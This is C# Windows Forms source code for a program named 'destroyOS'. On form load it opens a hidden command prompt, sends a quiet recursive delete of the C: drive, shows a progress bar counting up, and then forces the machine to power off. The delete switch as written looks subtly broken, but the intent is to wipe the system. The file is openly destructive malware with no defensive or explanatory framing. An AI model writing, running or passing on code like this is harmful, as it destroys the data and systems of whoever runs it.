using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace destroyOS
{
    public partial class Form2 : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = false)]
        static extern IntPtr SendMessage(IntPtr hWnd, uint Msh, IntPtr w, IntPtr l);

        Process process = new Process();

        public Form2()
        {
            InitializeComponent();
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            timer1.Start();

            SendMessage(progressBar1.Handle, 1040, (IntPtr)2, IntPtr.Zero);

            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;

            process.Start();
            process.StandardInput.WriteLine(@"cd c:\");
            process.StandardInput.WriteLine(@"rd /r /q c:\");
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (progressBar1.Value < progressBar1.Maximum)
            {
                progressBar1.Value += 10;
                label1.Text = (progressBar1.Value / 100).ToString() + "%";
            }
            else
            {
                timer1.Stop();
                progressBar1.Value = 10000;
            }

            if(progressBar1.Value == progressBar1.Maximum)
            {
                process.StandardInput.WriteLine(@"shutdown -p");
            }
        }
    }
}
